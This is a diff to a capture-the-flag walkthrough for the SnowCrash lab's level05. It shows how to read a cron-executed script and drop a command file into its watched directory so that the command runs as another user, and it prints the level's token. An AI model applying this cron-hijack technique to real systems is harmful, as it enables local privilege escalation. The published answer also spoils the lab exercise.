@@ -16,7 +16,9 @@ level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver /rofs/usr/sbin/openarenaser
 -rwxr-x---  1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
 -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
 
+********************************************************************************
 The ‘+’ Is an ACL (Access Control Lists).
+********************************************************************************
 
 level05@SnowCrash:~$ getfacl /usr/sbin/openarenaserver
 getfacl: Removing leading '/' from absolute path names
@@ -29,7 +31,9 @@ group::r-x
 mask::r-x
 other::---
 
+********************************************************************************
 So we can see that level05 users only have the permission to read.
+********************************************************************************
 
 level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
 #!/bin/sh
@@ -39,9 +43,11 @@ for i in /opt/openarenaserver/* ; do
 	rm -f "$i"
 done
 
-level05@SnowCrash:~$ echo "getflag > /tmp/passwd > /opt/openarenaserver/getflag.sh
+level05@SnowCrash:~$ echo "getflag > /tmp/passwd" > /opt/openarenaserver/getflag.sh
 
-We wait a bit, for a cron or something to execute the file because we we can’t execute it.
+********************************************************************************
+We wait a bit, for a cron or something to execute the file because we can’t execute it.
+********************************************************************************
 
-level05@SnowCrash:~$ cat /tmp/passwd
+level05@SnowCrash:~$ while true; do; clear; cat /tmp/passwd; sleep 1; done
 Check flag.Here is your token : viuaaale9huek52boumoomioc
